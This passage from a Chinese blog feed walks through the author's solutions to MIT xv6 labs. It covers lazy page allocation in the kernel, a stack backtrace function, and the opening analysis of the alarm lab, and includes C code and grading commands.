uvmdealloc(p-&gt;pagetable, sz, sz + n);</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;sz = sz;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接着实现抽离出来的<strong>physical address</strong>的分配和映射，即<strong>lazy allocation</strong>的后半部分<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="comment">// va page is lazy allocated</span></span><br><span class="line"><span class="comment">// yet now it should allocate the </span></span><br><span class="line"><span class="comment">// relative physical page in no time</span></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">lazy_allocate</span><span class="params">(uint64 va)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  uint64 pa = <span class="number">-1</span>;</span><br><span class="line">  <span class="type">pte_t</span> *pte = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// access the virtual address out of</span></span><br><span class="line">  <span class="comment">// alloced virtual memory</span></span><br><span class="line">  <span class="keyword">if</span>(va &gt;= p-&gt;sz) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(va % PGSIZE)</span><br><span class="line">    panic(<span class="string">&quot;lazy_allocate(): va not aligned\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// if access the guard page under the stack</span></span><br><span class="line">  <span class="comment">// it should kill the process</span></span><br><span class="line">  pte = walk(p-&gt;pagetable, va, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(pte &amp;&amp; (*pte &amp; PTE_V) != <span class="number">0</span> &amp;&amp; (*pte &amp; PTE_U) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// if not enough physical memory</span></span><br><span class="line">  <span class="keyword">if</span>((pa = (uint64)kalloc()) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, pa, </span><br><span class="line">              PTE_R | PTE_W | PTE_X | PTE_U) != <span class="number">0</span>) &#123;</span><br><span class="line">    kfree((<span class="type">void</span>*)pa);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> pa;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>剩下的，则是在实际访问使用<strong>lazy allocation</strong>的<strong>virtual addresss</strong>时，完成最终的分配即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="comment">// Copy from kernel to user.</span></span><br><span class="line"><span class="comment">// Copy len bytes from src to virtual address dstva in a given page table.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on error.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">copyout</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 dstva, <span class="type">char</span> *src, uint64 len)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line"></span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      pa0 = lazy_allocate(va0); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy from user to kernel.</span></span><br><span class="line"><span class="comment">// Copy len bytes to dst from virtual address srcva in a given page table.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on error.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">copyin</span><span class="params">(<span class="type">pagetable_t</span> pagetable, <span class="type">char</span> *dst, uint64 srcva, uint64 len)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(srcva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      pa0 = lazy_allocate(va0);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    srcva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy a null-terminated string from user to kernel.</span></span><br><span class="line"><span class="comment">// Copy bytes to dst from virtual address srcva in a given page table,</span></span><br><span class="line"><span class="comment">// until a &#x27;\0&#x27;, or max.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on error.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">copyinstr</span><span class="params">(<span class="type">pagetable_t</span> pagetable, <span class="type">char</span> *dst, uint64 srcva, uint64 max)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="type">int</span> got_null = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(got_null == <span class="number">0</span> &amp;&amp; max &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(srcva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      pa0 = lazy_allocate(va0);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    srcva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/trap.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// handle the page fault by load page fault or</span></span><br><span class="line"><span class="comment">// store page fault.</span></span><br><span class="line"><span class="comment">// the virtual address trigggering the page fault</span></span><br><span class="line"><span class="comment">// is in stval</span></span><br><span class="line"><span class="comment">// So just map relative virtual memory to a new</span></span><br><span class="line"><span class="comment">// alloced physical memory</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">handle_page_fault</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 va = PGROUNDDOWN(r_stval());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(lazy_allocate(va) == <span class="number">0</span>)</span><br><span class="line">    myproc()-&gt;killed = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// handle an interrupt, exception, or system call from user space.</span></span><br><span class="line"><span class="comment">// called from trampoline.S</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line">  uint64 scause = r_scause();</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">    <span class="keyword">switch</span>(scause) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xd</span>:</span><br><span class="line">        <span class="comment">// Load page fault</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xf</span>:</span><br><span class="line">        <span class="comment">// Store page fault</span></span><br><span class="line"></span><br><span class="line">        handle_page_fault();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">        p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>除了直接访问<strong>lazy allocation</strong>的虚拟地址外，可能会操作包含有<strong>lazy allocation</strong>的页表，也需要特别处理一下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="comment">// Remove npages of mappings starting from va. va must be</span></span><br><span class="line"><span class="comment">// page-aligned. The mappings must exist.</span></span><br><span class="line"><span class="comment">// Optionally free the physical memory.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">uvmunmap</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va, uint64 npages, <span class="type">int</span> do_free)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 a;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((va % PGSIZE) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;uvmunmap: not aligned&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(a = va; a &lt; va + npages*PGSIZE; a += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(pagetable, a, <span class="number">0</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// unmap the lazy allocation</span></span><br><span class="line">      <span class="comment">// page, so just ignore is ok.</span></span><br><span class="line">      <span class="keyword">if</span>(va &lt; myproc()-&gt;sz)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      panic(<span class="string">&quot;uvmunmap: walk&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// unmap the lazy allocation</span></span><br><span class="line">      <span class="comment">// page, so just ignore is ok.</span></span><br><span class="line">      <span class="keyword">if</span>(va &lt; myproc()-&gt;sz)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      panic(<span class="string">&quot;uvmunmap: not mapped&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Given a parent process&#x27;s page table, copy</span></span><br><span class="line"><span class="comment">// its memory into a child&#x27;s page table.</span></span><br><span class="line"><span class="comment">// Copies both the page table and the</span></span><br><span class="line"><span class="comment">// physical memory.</span></span><br><span class="line"><span class="comment">// returns 0 on success, -1 on failure.</span></span><br><span class="line"><span class="comment">// frees any allocated pages on failure.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="type">char</span> *mem;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// copy the lazy allocation</span></span><br><span class="line">      <span class="comment">// page, so just ignore is ok.</span></span><br><span class="line">      <span class="keyword">if</span>(i &lt; myproc()-&gt;sz)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// copy the lazy allocation</span></span><br><span class="line">      <span class="comment">// page, so just ignore is ok.</span></span><br><span class="line">      <span class="keyword">if</span>(i &lt; myproc()-&gt;sz)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make grade</span><br></pre></td></tr></table></figure><br><img src="lazy_allocation实验结果.png" alt="lazy allocation实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6-四</title>
      <link href="/2022/06/07/xv6-%E5%9B%9B/"/>
      <url>/2022/06/07/xv6-%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客探索一下xv6从<strong>U-mode</strong>地址空间<strong>trap</strong>(陷入)到<strong>S-mode</strong>地址空间的机制(前面<a href="/2022/05/21/xv6-%E4%BA%8C/" title="xv6-二">xv6-二</a>已经介绍的非常详细了)</p><h1 id="Lab-traps"><a href="#Lab-traps" class="headerlink" title="Lab traps"></a>Lab traps</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/traps.html">lab</a>帮助熟悉<strong>xv6</strong>的<strong>trap</strong>(陷入)机制</p><h2 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Implement a backtrace() function in kernel/printf.c. Insert a call to this function in sys_sleep, and then run bttest, which calls sys_sleep. Your output should be as follows:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">backtrace:</span><br><span class="line">0x0000000080002cda</span><br><span class="line">0x0000000080002bb6</span><br><span class="line">0x0000000080002898</span><br></pre></td></tr></table></figure><p>After bttest exit qemu. In your terminal: the addresses may be slightly different but if you run addr2line -e kernel/kernel (or riscv64-unknown-elf-addr2line -e kernel/kernel) and cut-and-paste the above addresses as follows:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ addr2line -e kernel/kernel</span><br><span class="line">0x0000000080002de2</span><br><span class="line">0x0000000080002f4a</span><br><span class="line">0x0000000080002bfc</span><br><span class="line">Ctrl-D</span><br></pre></td></tr></table></figure><p>You should see something like this:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kernel/sysproc.c:74</span><br><span class="line">kernel/syscall.c:224</span><br><span class="line">kernel/trap.c:85</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据riscv的调用约定，riscv的<strong>stack frame</strong>(栈帧)有固定格式<br><img src="frame.png" alt="riscv帧示意图"></p><p>可以看到，每一个<strong>frame</strong>的前16个字节，保存着<strong>返回地址</strong>和<strong>上一个frame的栈顶地址</strong></p><p>通过当前<strong>frame</strong>的地址(s0寄存器值)，即可以此遍历当前所有的<strong>frame</strong></p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>首先，在<strong>kernel/vm.c</strong>中添加<strong>kwalkaddr</strong>函数，从而判断对应的<strong>s0</strong>指向的地址是否为有效地址，用以终止<strong>frame</strong>的遍历<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="comment">// Look up a virtual address, return the physical address,</span></span><br><span class="line"><span class="comment">// or 0 if not mapped.</span></span><br><span class="line"><span class="comment">// It is lookup in kernel pagetable</span></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">kwalkaddr</span><span class="params">(uint64 va)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(va &gt;= MAXVA)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  pte = walk(kernel_pagetable, va, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(pte == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  pa = PTE2PA(*pte);</span><br><span class="line">  <span class="keyword">return</span> pa;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其次，在<strong>kernel/printf.c</strong>中，通过内敛汇编获取当前<strong>frame</strong>的<strong>s0</strong>寄存器值，从而按照前面所分析的，完成所有<strong>frame</strong>的遍历<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/printf.c</span></span><br><span class="line"><span class="comment">// print the call stack to console</span></span><br><span class="line"><span class="comment">// according to the call convention</span></span><br><span class="line"><span class="comment">// -8(s0) is the return address</span></span><br><span class="line"><span class="comment">// -16(s0) is the prev frame&#x27;s s0</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">backtrace</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 s0;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// get the current frame s0</span></span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;mv %0, s0&quot;</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;=r&quot;</span>(s0))</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;backtrace:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//walk through the frame</span></span><br><span class="line">  <span class="keyword">while</span>(kwalkaddr(s0)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, *(uint64*)(s0 - <span class="number">8</span>));</span><br><span class="line">    s0 = *(uint64*)(s0 - <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;backtrace&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="backtrace实验结果.png" alt="backtrace实验结果"></p><h2 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h2><h3 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h3><blockquote><p>In this exercise you’ll add a feature to xv6 that periodically alerts a process as it uses CPU time. This might be useful for compute-bound processes that want to limit how much CPU time they chew up, or for processes that want to compute but also want to take some periodic action. More generally, you’ll be implementing a primitive form of user-level interrupt/fault handlers; you could use something similar to handle page faults in the application, for example. Your solution is correct if it passes alarmtest and usertests. </p></blockquote><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>刚看到这个lab时，就立马联想到前面<a href="/2022/04/28/linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E5%85%AB/" title="linux内核学习-八">linux内核学习-八</a>中Linux内核处理信号的过程</p><p>要实现<strong>alarm</strong>功能，主要有以下几个难点</p><ol><li>如何记录并触发<strong>alarm</strong></li><li>如何执行<strong>U-mode</strong>中进程定义的<strong>handler</strong></li><li>如何从<strong>handler</strong>中返回触发<strong>alarm</strong>前的上下文</li></ol><h4 id="记录和触发alarm"><a href="#记录和触发alarm" class="headerlink" title="记录和触发alarm"></a>记录和触发alarm</h4><p>只需要在<strong>struct proc</strong>中添加相关的数据结构，即可记录<strong>alarm</strong>的时间间隔、当前状态和<strong>handler</strong>信息</p><p>而触发<strong>alarm</strong>也很简单，只需要在每次<strong>timer interrupt</strong>(时钟中断)时刷新<strong>alarm</strong>数据结构信息，并判断即可</p><h4 id="执行handler"><a href="#执行handler" class="headerlink" 